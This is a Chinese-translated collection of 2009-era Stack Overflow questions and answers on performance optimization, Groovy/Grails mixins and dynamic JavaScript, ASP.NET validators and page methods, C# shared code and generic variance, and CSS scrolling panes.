1.  使用#defines 而不是函数来避免函数调用的惩罚。我已经看到代码的定义扩展结果会生成巨大且非常慢的代码。当然也无法调试。内联函数是执行此操作的方法，但也应谨慎使用它们。

2.  我见过代码，其中独立测试已被转换为可在 switch 语句中使用的单词中的位。Switch 可以非常快，但是当人们将一系列独立测试转换为位掩码并开始编写一些 256 个优化的特殊情况时，他们最好有一个非常好的基准来证明这会带来性能提升。从维护的角度来看，这确实很痛苦，并且独立处理不同的测试会使代码更小，这对性能也很重要。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2009-01-08T19:55:17.920

缺乏清晰的程序结构是其中最大的代码罪过。被认为很快的复杂逻辑几乎从来没有。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2009-01-08T20:16:21.827

**利用你的编程语言。**诸如使用异常处理而不是 if/else 之类的事情只是因为在 PLSnakish 1.4 中它更快。你猜怎么了？有可能它根本没有更快，两年后维护您的代码的人会非常生气，因为您混淆了代码并使其运行速度慢得多，因为在 PLSnakish 1.8 中，语言维护人员修复了问题，现在 if/else比使用异常处理技巧快 10 倍。使用您**的**编程语言和框架！

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2009-01-08T21:39:48.613

**在编写代码时不要重构或优化。**在完成之前不要尝试优化代码，这一点非常重要。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2009-03-09T22:53:53.263

Julian Birch 曾经告诉我：

*“是的，但是实际运行该应用程序需要多少年才能弥补开发人员花费的时间？”*

他指的是每次交易期间通过需要一定时间来实施的优化所节省的累计时间。

老圣人的智慧之言……在考虑进行时髦的优化时，我经常想到这个建议。您可以通过考虑开发人员花费了多少时间来处理处于当前状态的代码与用户节省了多少时间来进一步扩展相同的概念。如果您愿意，您甚至可以按开发人员与用户的小时费率来衡量时间。

当然，有时它是无法衡量的，例如，如果电子商务应用程序需要多 1 秒的时间来响应，那么您将在 1 秒内因用户感到无聊而损失一些小部分资金。为了弥补这一秒，您需要实现**和维护**优化的代码。优化对毛利润产生积极影响，对净利润产生消极影响，因此更难以平衡。您可以尝试-具有良好的统计数据。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2009-01-08T20:57:15.317

一次更改多个变量。这让我非常**疯狂**！当不止一件事发生变化时，如何确定更改对系统的影响？

与此相关的是，进行观察无法保证的更改。如果进程不受 CPU 限制，为什么要添加更快/更多的 CPU？

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2009-01-08T20:18:56.767

**一般解决方案**。

仅仅因为给定的模式/技术在一种情况下表现更好并不意味着它在另一种情况下表现更好。

.Net 中过度使用 StringBuilder 就是一个常见的例子。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2009-01-08T20:56:32.103

Michael A Jackson 给出了优化性能的两条规则：

1.  不要这样做。
2.  （仅限专家）不要这样做。

如果人们担心性能，告诉他们让它成为现实——什么是好的性能，你如何测试它？然后，如果您的代码没有达到他们的标准，至少这是代码编写者和应用程序用户同意的事情。

如果人们担心重写僵化代码的非性能成本（例如，时间槽），那么请提出您的估计并证明它可以在时间表中完成。假设可以。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2009-01-08T21:46:57.867

一些开发人员认为，一个快速但不正确的解决方案有时比一个缓慢但正确的解决方案更可取。所以他们会忽略生产中“永远不会发生”或“无关紧要”的各种边界条件或情况。

这从来都不是一个好主意。解决方案总是需要“正确”。

您可能需要根据情况调整“正确”的定义。重要的是您知道/准确地定义您希望任何条件下的结果，并且代码给出了这些结果。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2009-03-09T23:01:45.507

有一次我有一个前客户打电话给我，询问我对加快他们的应用程序的任何建议。

他似乎希望我说“检查 X，然后检查 Y，然后检查 Z”之类的话，换句话说，提供专家猜测。

我回答说你必须诊断问题。我的猜测可能比别人的错误少，但他们仍然是错误的，因此令人失望。

我不认为他明白。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2009-01-08T20:18:35.550

我相信这是一个普遍的神话，即“接近金属”的超级精简代码比优雅的域模型更高效。

这显然被 DirectX 的创建者/首席开发人员揭穿了，他们用 C# 重新编写了 c++ 版本，并进行了大量改进。[需要来源]

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2009-01-08T20:22:23.933

当您提前知道数组应该有多大并且可以预先分配它时，使用（例如）C++ STL 中的 push_back()、D 中的 ~= 等附加到数组。

# grails - Groovy Mixin？

> ID：425617
> 
> 赞同：10
> 
> 时间：2009-01-08T19:50:19.180
> 
> 标签：grails, groovy, mixins

我正在尝试在我的 Groovy/Grails 应用程序中混入一个类，并且我正在使用[docs 中定义的语法](http://docs.codehaus.org/display/GroovyJSR/Mixins#Mixins-StaticMixing)，但我不断收到错误消息。

我有一个看起来像这样的域类：

```
class Person {
  mixin(ImagesMixin)

  // ...
} 
```

它编译得很好，但由于某种原因它不起作用。包含 ImagesMixin 的文件位于我的`/src/groovy/`目录中。

我已经使用 Groovy 版本 1.5.7 和 1.6-RC1 尝试过，但没有任何运气。有谁知道我做错了什么？

堆栈跟踪：

```
2008-12-30 17:58:25.258::WARN:  Failed startup of context org.mortbay.jetty.webapp.WebAppContext@562791{/FinalTransmission,/home/kuccello/Development/workspaces/lifeforce/FinalTransmission/web-app}
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pluginManager' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Invocation of init method failed; nested exception is java.lang.ExceptionInInitializerError
    at java.security.AccessController.doPrivileged(Native Method)
    at RunApp_groovy$_run_closure2_closure7.doCall(RunApp_groovy:67)
    at RunApp_groovy$_run_closure2_closure7.doCall(RunApp_groovy)
    at Init_groovy$_run_closure6.doCall(Init_groovy:131)
    at RunApp_groovy$_run_closure2.doCall(RunApp_groovy:66)
    at RunApp_groovy$_run_closure2.doCall(RunApp_groovy)
    at RunApp_groovy$_run_closure1.doCall(RunApp_groovy:57)
    at RunApp_groovy$_run_closure1.doCall(RunApp_groovy)
    at gant.Gant.dispatch(Gant.groovy:271)
    at gant.Gant.this$2$dispatch(Gant.groovy)
    at gant.Gant.invokeMethod(Gant.groovy)
    at gant.Gant.processTargets(Gant.groovy:436)
    at gant.Gant.processArgs(Gant.groovy:372)
Caused by: java.lang.ExceptionInInitializerError
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Class.java:169)
    at Episode.class$(Episode.groovy)
    at Episode.<clinit>(Episode.groovy)
    ... 13 more
Caused by: groovy.lang.MissingMethodException: No signature of method: static Person.mixin() is applicable for argument types: (java.lang.Class) values: {class ImagesMixin}
    at Broadcast.<clinit>(MyClass.groovy:17)
    ... 17 more
2008-12-30 17:58:25.259::WARN:  Nested in org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'pluginManager' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Invocation of init method failed; nested exception is java.lang.ExceptionInInitializerError:
groovy.lang.MissingMethodException: No signature of method: Person.mixin() is applicable for argument types: (java.lang.Class) values: {class ImagesMixin}
    at Broadcast.<clinit>(Person.groovy:17)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Class.java:169)
    at Episode.class$(BelongsToMyClass.groovy)
    at Episode.<clinit>(BelongsToMyClass.groovy)
    at java.security.AccessController.doPrivileged(Native Method)
    at RunApp_groovy$_run_closure2_closure7.doCall(RunApp_groovy:67)
    at RunApp_groovy$_run_closure2_closure7.doCall(RunApp_groovy)
    at Init_groovy$_run_closure6.doCall(Init_groovy:131)
    at RunApp_groovy$_run_closure2.doCall(RunApp_groovy:66)
    at RunApp_groovy$_run_closure2.doCall(RunApp_groovy)
    at RunApp_groovy$_run_closure1.doCall(RunApp_groovy:57)
    at RunApp_groovy$_run_closure1.doCall(RunApp_groovy)
    at gant.Gant.dispatch(Gant.groovy:271)
    at gant.Gant.this$2$dispatch(Gant.groovy)
    at gant.Gant.invokeMethod(Gant.groovy)
    at gant.Gant.processTargets(Gant.groovy:436)
    at gant.Gant.processArgs(Gant.groovy:372)
2008-12-30 17:58:25.271::INFO:  Started SelectChannelConnector@0.0.0.0:8080 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-08-13T20:42:51.823

从 Groovy 1.6 开始，您可以在编译时使用注解将 mixin 应用于类

```
@Mixin(ImagesMixin)
class Person {
} 
```

或者您可以像这样在运行时应用 mixin：

```
def myMixin = ImagesMixin
Person.mixin myMixin 
```

后一种方法更加动态，因为可以在运行时确定要混合的类。有关 Groovy mixins 的更多信息，请参见[此处](http://www.infoq.com/articles/groovy-1-6)。

以我的经验，很多领域类的元编程根本行不通。我不完全知道为什么，但怀疑这是因为这些类已经被 Grails 运行时进行了非常大量的元编程。一般来说，我的方法是

*   在 Groovy 控制台中尝试在 POGO 上进行元编程
*   如果可行，请在 Grails 控制台中的非域类上尝试
*   如果可行，请在 Grails 控制台中的域类上尝试。如果它不起作用，那么它一定是因为它是一个域类（而不是语法问题）。在这一点上，建议尝试找到另一种实现目标的方法。如果这不可能，那么结合使用 Grails 邮件列表和/或 Stackoverflow 和/或 Grails 源代码来尝试让元编程工作。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-01-22T15:07:19.583

我认为您没有使用正确的 mixin 语法。尝试这个：

```
class MyMixin {
    static doStuff(Person) {
        'stuff was done'
    }
}

class Person {}

Person.mixin MyMixin

new Person().doStuff()
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-08T20:16:36.893

我猜你所看到的与其说是一个特性，不如说是一个提议；）Groovy 还不支持以这种方式开箱即用的mixin（如果有的话）。但是有一个 3rd 方库可以用来模拟这种行为：[Injecto](http://ldaley.com/injecto/)。并且可以在 1.6 版本的 Groovy（还不是最终版本）中使用 AST-Macros 定义 mixins。

您应该始终检查您是从真正的 groovy 项目还是从 GroovyJSR 项目（这是一个收集提案的地方）阅读文档。

另一种方法是使用普通的 MOP 通过修改元类将行为注入到 groovy 类中。

干杯

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-08-10T06:21:00.777

万一这对任何人都有帮助，从上面的@virtualeyes 评论开始，我发现

```
Person.doStuff() 
```

除非您先调用以下命令，否则失败：

```
new Person().doStuff()
Person.doStuff() 
```

之后，类上的静态方法似乎确实有效（对我来说，使用 Grails 2.2.4）我想这与初始化类有关，但我尝试了：

```
Person.metaClass.initialize()
Person.doStuff() 
```

那没有用！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-21T05:26:25.403

仅供参考：现在 Grails 中有“嵌入式”域这样的东西，但它有问题。在这里，您可以在逻辑上将一个域包含为另一个域的一部分，并使其所有字段都物理地出现在一个 DB 表中。例如，如果您发现在多个表中出现了相同的字段子集，例如街道地址/城市/州/邮编，您可以定义 StreetAddress 域并将其嵌入。当前的问题之一是 Grails 仍然会创建一个 street_address 表，除了将它的字段嵌入到其他表中（除非你玩诡计）。似乎有提交的补丁等待处理。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-09-12T19:03:57.797

Grails domain objects are already heavily meta-programmed. Instead of the groovy mixin try:

```
@grails.util.Mixin(ImagesMixin)
    class Person {
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-10-22T22:37:24.423

使用特质！

Traits 是他们移除对 mixin 的支持的原因，因为这样更好。它们基本上是实现的抽象类。允许您使用多个并将它们作为部分类进行操作。

```
trait A {
    void printSomething() {
        println "foobar"
    }
}

class B implements A {
    void printAnything() {
        printSomething()
    }
}

new B().printAnything() 
```

试试看！

# javascript - 在 Grails 的 JavaScript 源代码中执行 groovy 语句

> ID：425618
> 
> 赞同：7
> 
> 时间：2009-01-08T19:50:24.420
> 
> 标签：javascript, grails, groovy

在 Grails 中，基本上有 2 个地方可以定义 JavaScript 函数，直接在 GSP 上的元素中，以及在 /web-app/js 下的单独 javascript 源文件中（例如 application.js）。我们在 application.js 中定义了一个常用的 javascript 函数，但我们还需要能够使用 groovy 代码动态生成函数的一部分。不幸的是，${some groovy code} 似乎没有在单独的 javascript 源文件中处理。

是通过在 GSP 页面上的脚本标记中定义 javascript 函数来做到这一点的唯一方法，还是有更通用的解决方案？显然，我们可以在模板 GSP 文件中的脚本标记中定义 javascript 函数，该文件将被重用，但是有很多努力将我们的 javascript 函数一起定义在一个地方（即外部 javascript 源文件）。这也有性能优势（javascript 源文件通常只由每个客户端的浏览器下载一次，而不是在他们访问的每个 html 页面的源中重新加载相同的 javascript 函数）。我玩弄了将功能分解为静态和动态部分的想法，将静态部分放在外部源中，将动态部分放在模板 GSP 中，然后将它们粘合在一起，

有任何想法吗？

（编辑：这听起来像是动态生成 JavaScript 函数的一部分，然后下载一次并由客户端一遍又一遍地使用的想法，这是一个坏主意。但是，“动态”部分只会改变也许每周或每月一次，然后很少。大多数情况下，我们只希望从数据库中生成这个片段，即使只有一次，而不是硬编码。）

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-08T20:03:15.173

保持 JavaScript 不显眼的一个简单解决方案是创建一个 JavaScriptController 并通过将其添加到`UrlMappings.groovy`文件中来映射其操作“/js/*”：

```
"/js/$action"{
  controller = "javascript"
} 
```

然后只需为您想要的每个动态 JS 文件创建一个动作，将其包含在您的布局 <HEAD> 中，然后，您就有了一个可以插入 Grails 片段的 JS 文件！:)

**注意：**我发现 Grails 目前存在一个错误，它不能正确地将文件扩展名映射到内容类型，因此您需要`<%@ page contentType="text/javascript; UTF-8" %>`在视图文件的顶部包含。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-05-15T18:59:11.367

这是一个很好的解决方案。我想提供一个建议来使用除映射之外的其他东西

```
“/js/$动作”
```

因为这将不再允许您访问 /web-app/js/ 中的 javascript 文件。您的所有 javascript 文件都必须移动到控制器指向的目录中。

我会使用类似的东西

```
“/dynjs/$动作”
```

这样，您仍然可以指向 /web-app/js/ 文件中的文件而不会发生冲突，并享受 javascript 文件中 gsp 标签的好处

如果我错了，请纠正我。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-22T15:23:09.893

或者这个......有一个标签/服务/动态方法，让标签写出他们的 JS+CSS+其他任何东西，到一个“缓存”，用于由不同的控制器构建 JS+CSS 资源。

完整的概念在这里：[ [http://www.anyware.co.uk/2005/2009/01/19/an-idea-to-give-grails-tags-esp/][1]](http://www.anyware.co.uk/2005/2009/01/19/an-idea-to-give-grails-tags-esp/][1])

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-01-14T18:33:00.117

如果您想在 Javascript 代码中使用由控制器创建的模型（呈现的 HTML 页面引用了您打算在其中使用 groovy 代码的 Javascript），那么您可以使用此技术：

此技术不需要更改 URL 映射，也不需要您创建额外的控制器。

在您看来 GSP 添加 javascript 如下：

```
 <script type="text/javascript">
        <g:render template="/javascript/yourJavascriptFile"/>
    </script> 
```

在视图文件夹中创建一个“javascript”文件夹。并创建一个名为：_yourJavascriptFile.gsp 的文件

您不仅可以使用 _yourJavascriptFile.gsp 文件中的所有 GSP 代码，还可以使用在控制器中创建的所有模型（即渲染视图）。

注意：javascript 文件夹没有什么特别之处。您可以将其命名为任何您想要的名称或使用现有的视图文件夹。这只是组织和识别您的 HTML spitting GSP 和 Javascript spitting GSP 的问题。或者，您可以使用一些命名约定，例如：_something.js.gsp 等。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-02-15T19:56:32.137

像这样命名你的脚本

```
/wherever/the/js/files/are/thescript.js.gsp 
```

里面的gsp代码会被grails正确渲染。这行得通，但我不知道它是否被认为是一个好主意。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-09T16:25:46.977

还有另一种方法 - 将生成的代码传递到需要闭包的函数中。这些闭包当然是由程序生成的。生成的代码当然是在 gsp 页面中内联/脚本标记的。

它可能会或可能不会工作，具体取决于生成的代码的性质。但我怀疑它会起作用，如果它不起作用，对你的 javascript 的编码风格进行细微的调整肯定会让它起作用。不过，如果这些“生成”的代码没有太大变化，这在 imo 中就显得有点矫枉过正了。

# asp.net - PageMethod 未更新 - 需要更新项目重建

> ID：425620
> 
> 赞同：0
> 
> 时间：2009-01-08T19:50:50.190
> 
> 标签：asp.net, pagemethods

我正在使用 AJAX 工具包：

```
 <ajaxToolkit:CascadingDropDown ID="CategoryDDL_C" runat="server" TargetControlID="CategoryDDL"
        Category="Main"  PromptText="Please select a category"  LoadingText="[Loading...]"
        ServiceMethod="MainDDL" /> 
```

对于服务方法：

```
[WebMethod]
[System.Web.Script.Services.ScriptMethod]
public static CascadingDropDownNameValue[] MainDDL(string knownCategoryValues, string category)
{
    CascadingDropDownNameValue[] CDDNV = new CascadingDropDownNameValue[1] ;
    CDDNV[0] = new CascadingDropDownNameValue(knownCategoryValues + "NO", "1");
    return CDDNV;
} 
```

但是，如果我在 MainDDL 方法中进行代码更改，它不会反映在页面上，直到我进行网站重建。

有什么线索可以在不进行完全重建的情况下更新页面方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T23:09:03.630

当代码隐藏文件更改时， Web*应用程序*项目需要重新编译，而*网站*项目则不需要。哪个是你的？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:01:19.267

不确定这是某种错误，还是一些奇怪的缓存问题，但我过去也遇到过同样的事情。这不是很方便，但与其重建站点，不如尝试重新保存您的 web.config 文件（您不必实际更改任何内容）。

# redirect - WebForm 中最早调用 Response.Redirect 的时间/地点是什么时候？

> ID：425623
> 
> 赞同：0
> 
> 时间：2009-01-08T19:51:19.987
> 
> 标签：redirect, webforms

我总是在我的 WebForm 的 OnLoad 方法中调用 Response.Redirect，主要是因为我看到的每个示例都是这样做的。我想知道在 OnPreInit 中这样做是否更有效（和正确）？即使**endResponse**参数为真？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T19:54:42.977

显然，越早越好。在重定向到真正感兴趣的页面之前，不要让你的服务器做比它需要做的更多的工作。

但是，您并不总是知道要在页面加载事件之前甚至稍后进行重定向 - 可能在处理按钮按下事件之后。

# java - 用于解析和构建逻辑表达式的 Java 库

> ID：425631
> 
> 赞同：3
> 
> 时间：2009-01-08T19:54:33.740
> 
> 标签：java

我正在寻找一个用于解析和构建类似 SQL 的表达式的 Java 开源库。

例如评估表达式的有效性，例如：

```
 "(a = x or y ) and (b != z)" 
```

此外，我想要一个用于构建或扩展表达式的 API。就像是：

```
Expression exp = new Expression();
exp.addCondition("a",{"x","y"},Operator.OR); 
```

实现这样一个库并不是很复杂，但是我们用Java开发不就是为了享受协同开发吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:58:55.433

我很确定你可以让[ANTLR](http://www.antlr.org/)为你做这件事。

语法看起来很简单（从这里）：P

# c# - 如何将常用 C# 代码添加到 Visual C# 2008 Express 项目/解决方案？

> ID：425634
> 
> 赞同：1
> 
> 时间：2009-01-08T19:54:42.460
> 
> 标签：c#, visual-studio, visual-studio-2008

（在 MS Visual 环境中，我仍然觉得自己像个新手……所以请多多包涵！）

我正在使用 Microsoft Visual C# 2008 Express Edition。

我有一个项目，在那个项目中有两种不同的形式。每个表单的 .cs 文件开头为：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace MyNameSpace
{
    public partial class MyFormName : Form
    {
... 
```

（...第二个是“MyFormName2”，但除此之外没有区别）

我想编写一个我知道两种表单都需要访问的函数。我右键单击我的项目，选择“添加”，选择“新建项目”，然后选择“代码文件”并将我的文件命名为“Common.cs”，它给了我一个完全空白的文件，它在我的项目中。

我该如何设置...？我想我应该做以下...

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace MyNameSpace
{
} 
```

...但是当我尝试添加如下功能时：

public void mytestfunc() { } 在该命名空间中我收到以下错误：

“预期的类、委托、枚举、接口或结构”

如何进行设置以便 MyFormName 和 MyFormName2 都可以使用“mytestfunc”？

谢谢！

-阿迪娜

更新：了解（现在）所有东西都必须在一个类中，但是我不明白如何真正使用它。这是否意味着我必须创建一个对象？这个常见的功能恰好只是一些数学......

所以现在如果我有这个：

```
namespace MyNameSpace
{
    public class MyCommonClass
    {
        public void testFunc()
        {
            MessageBox.Show("Hee hee!");
            return;
        }
    }
} 
```

...如何从我的表单中调用 testFunc？我必须执行以下操作：

```
MyCommonClass temp = new MyCommonClass;
temp.testFunc(); 
```

还是有另一种方法可以调用 testFunc？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T19:59:32.903

如果您执行以下操作：

```
namespace MyNameSpace
{
    public class myclass
    {
        public myMethod()
        {
            // Code
        }
    }
} 
```

您将能够实例化和访问它。如果您将其更改为：

```
namespace MyNameSpace
{
    public class myclass
    {
        public static myMethod()
        {
            // Code
        }
    }
} 
```

您将能够调用 myClass.myMethod 而无需实例化新的 myClass。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:00:54.993

简短的回答是一切都需要在一个类中；我建议您坐下来[阅读基本教程](http://www.csharp-station.com/Tutorial.aspx)，以帮助您掌握基础知识...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T19:59:04.667

代码需要在类中。

它看起来像这样：

```
using System;

namespace MyNameSpace
{
   public class CommonHelper
   {
       public string FormatMyData(object obj)
       {
            //do something
            return String.Empty;
       }
   }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:44:16.853

如果您调用的函数与表单无关，请将其设为静态

```
namespace myns
{
    public static class myhelper
    {
        public static void DoSomething()
        {
        }
    }
} 
```

并使用 myhelper.DoSomething() 调用该方法；

如果您要调用的函数以某种方式与表单相关，例如跨多个表单的通用功能，则从 Form 派生一个类（不需要可视表单）并使其成为可视表单的基类：

```
namespace myns
{
    public class MyFormBase : Form
    {
        protected void DoSomethingWithTheForm()
        {
        }
    }
} 
```

并在您表单的 .cs 中：

```
namespace myns
{
    public partial class MyFormName : MyFormBase
    {
    }
} 
```

# c# - 在 ASP.NET 中使用 ValidationSummary 时如何不显示 BaseValidator.Text

> ID：425641
> 
> 赞同：0
> 
> 时间：2009-01-08T19:56:27.700
> 
> 标签：c#, asp.net, vb.net, validation, customvalidator

我在 Web 表单上使用了一堆不同的 asp.net 验证控件。其中一些将其 Text 属性设置为“*错误”或“您错过了这些字段”之类的内容。

但是，一些 CustomValidator 控件具有空白的 Text 属性。我故意将它们留空，因为我根据哪种情况失败动态添加 ErrorMessage。（CustomValidator 可能有许多不同的条件，我设置 args.IsValid = false）

发生错误时，我设置的 ErrorMessage 属性会显示在 ValidationSummary 和 Validator 控件中。我不想要那个。我希望能够**在 ValidationSummary 中而不是在 BaseValidator.Text 属性中显示 ErrorMessage。**

我的第一次尝试是将 Text 属性设置为空格“”。那没有用。

我（目前）实现的是一个显示为与背景颜色相同的句点。这是一个黑客 - 我不喜欢它。哎呀，也许这就是我在这里的原因！

这是代码：

```
<asp:CustomValidator ID="StackOverflowValidator" runat="server" 
    Text="." 
    CssClass="validatorstyle"
    Display="Dynamic" 
    OnServerValidate="validate_AllowedToDoSomething" 
    ValidationGroup="MainGroup" />

<asp:ValidationSummary ID="mainGroupValidationSummary" runat="server" 
    ValidationGroup="MainGroup" 
    DisplayMode="BulletList" 
    HeaderText="There was an error in saving.  Please check the following:" /> 
```

在我调用的 validate_AllowedToDoSomething 里面：

```
StackOverflowValidator.ErrorMessage = "Custom Error Message #1";
args.IsValid = false;
return; 
```

我在 Web 表单上得到**两次“自定义错误消息 #1”。**提前致谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T20:09:53.257

只需设置`display="none"`而不是`"dynamic"`在 BaseValidator 上，这应该可以解决它。

# c# - 如何解决 Type.IsAssignableFrom 不使用继承的接口？

> ID：425655
> 
> 赞同：1
> 
> 时间：2009-01-08T19:59:18.490
> 
> 标签：c#

我制作了一个测试用例来说明我遇到的问题。

第一个断言通过，但第二个和第三个都失败了。

有没有办法以不同的方式检查两个失败条件 k 中的任何一个？如果它不是非常快，因为我打算在每种类型的基础上缓存结果，那将是可以的。

```
public interface IParentInterface
{

}

public interface IChildInterface : IParentInterface
{

}

public class ParentClass<T> where T: IParentInterface
{

}

public class ChildClass : ParentClass<IChildInterface>
{

}

public class TestClass
{
    public ChildClass Property { get; set; }
}

[TestFixture]
public class ScratchPad
{

    [Test]
    public void Assignabl()
    {
        var tc = new TestClass();
        var tct = tc.GetType();

        var pi = tct.GetProperty("Property");

        Assert.IsNotNull(pi);

        Assert.IsTrue(typeof(ParentClass<IChildInterface>).IsAssignableFrom(pi.PropertyType));
        Assert.IsTrue(typeof(ParentClass<>).IsAssignableFrom(pi.PropertyType));
        Assert.IsTrue(typeof(ParentClass<IParentInterface>).IsAssignableFrom(pi.PropertyType));

    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T20:11:55.767

您的第二个断言失败是设计使然。当你写

```
public class ParentClass<ParentInterface> 
```

它实际上意味着“ParentInterface”现在是类型参数的符号（这样做非常令人困惑，事实上，它完全让你感到困惑）。写作

```
public class ChildClass : ParentClass<ChildInterface> 
```

然后将您的类型参数（是的，名为“ParentInterface”的参数）设置为 ChildInterface 类型。因此，Childclass 只能分配给 ParentClass<ChildInterface>。

最后，您应该确保在定义类型参数时遵循约定，它会减少您的困惑，例如

```
public class ParentClass<T> 
```

用“I”标记接口也将大大增强理解，例如

```
interface IParent { }
interface IChild : IParent { } 
```

我怀疑在我们获得 c# 4.0 之前，你想要的东西是不可能的：

```
Parent<IChild> 
```

不可分配给

```
Parent<IParent> 
```

泛型目前没有协变/逆变。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:11:38.747

这不是[协变/逆变的东西](https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=282003)吗？

那么这只是 C# 目前不支持的东西，但 C# 4.0 可能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T20:12:34.127

你不能，因为 C# 3.0 不支持这种变化。在 C# 4.0 中，您应该可以。

使用另一个示例，假设您有 a `List<ParentInterface>`，并且*可以*将其分配给 a `List<ChildInterface>`：

```
List<ParentInterface> parentList = List<ParentInterface>();
List<ChildInterface> childList = parentList; 
```

问题是内部存储`parentList`是用于`ParentInterface`类型的。如果您从以下位置派生另一个接口`ChildInterface`：

```
public interface ParentInterface2 : ChildInterface {} 
```

然后尝试将其添加为`childList`：

```
childList.Add(new ParentInterface2Implementation()); 
```

你会得到一个例外，因为`childList`它真的是 a`List<ParentInterface>`并且只能存储 的实现`ParentInterface`，而`ParentInterface2`事实并非如此。

# html - 如何使用 HTML 和 CSS 编写预览窗格（主/详细信息）

> ID：425661
> 
> 赞同：3
> 
> 时间：2009-01-08T20:00:33.947
> 
> 标签：html, css

在 CSS 的现代时代，我将如何创建一对面板（例如，像 Outlook 中的预览窗口，或用于主/详细视图）？理想情况下，顶部（主）窗格会在哪里获得滚动条等？

预期的用例是用户可以在顶部窗口中滚动，同时始终能够看到预览/详细信息窗口（我打算通过 jQuery 将所选行的数据加载到底部面板中）。

在旧世界（表格布局）中，我可能有类似的东西：

```
<html>
<body>
  <table height="100%" border="1" width="100%">
    <tr height="*"><td>master</td></tr>
    <tr height="100"><td>detail</td></tr>
</body>
</html> 
```

那么这如何转化为 CSS 呢？（特别是在两个窗口上获取滚动条）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-08T20:05:48.693

好吧，如果您实际上使用的是 Windows，那么听起来您正在谈论框架甚至 iFrame。

不过，我的假设是，当您说“窗口”时，您只是指的是可滚动区域的概念。为此，可以将 css 属性“溢出”设置为“滚动”，如果包含的元素大小大于自身大小，它将滚动。

一个简单的代码示例：

```
#window-one, #window-two {
    width: 100%;
    height: 50%;
    overflow: scroll;
}
```

```
<html>
  <body>
    <div id="window-one">
      <p>Content for window one goes here.</p>
    </div>
    <div id="window-two">
      <p>Content for window two goes here.</p>
    </div>
  </body>
</html>
```

这将创建两个占据 50% 高度的“窗格”（窗口），但跨越窗口的整个宽度。滚动条将自动设置在窗格上，即使不需要（在这种情况下它们被禁用。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T20:13:33.110

有很多好的方法可以做到这一点 - 你可以使用任何块级元素（如 div）和`overflow:scroll`. 这将允许您做您想做的事，而无需求助于框架等复杂的东西（除非这是您需要的）。

尝试这样的事情：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <title>untitled</title>
        <style type="text/css">
            .pane {
                margin:20px;
                width:300px;
                height:100px;
                overflow:scroll;
            }
        </style>
    </head>
    <body>
        <div class="pane">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin ac ipsum id diam ullamcorper viverra. Ut nec risus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Pellentesque pulvinar. Integer vel est. Sed elementum, tortor nec sollicitudin semper, eros purus suscipit pede, in dictum metus ligula id mauris. Donec augue metus, malesuada a, ultricies eu, volutpat quis, est. Fusce suscipit. Mauris magna. Nulla facilisi. Praesent sem odio, imperdiet ac, vestibulum quis, lacinia eget, nibh. Nunc faucibus pede nec pede. Duis eget risus. In hac habitasse platea dictumst. Cras nunc odio, tempus et, condimentum ut, lacinia quis, est. Fusce ipsum metus, accumsan a, faucibus et, semper vitae, pede. Cras est. Vivamus metus dui, lobortis at, fermentum cursus, dapibus eget, orci. Cras imperdiet. </div>
